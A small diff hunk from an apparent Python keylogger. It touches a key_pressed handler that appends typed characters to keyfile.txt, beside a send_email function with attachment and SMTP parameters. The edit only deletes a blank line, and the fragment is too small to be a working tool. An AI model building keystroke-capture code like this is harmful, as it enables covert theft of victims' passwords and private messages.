@@ -52,7 +52,6 @@ def send_email(subject, body, to_email, attachment_path, smtp_server, smtp_port,
 
 
 def key_pressed(key):
-    
     with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
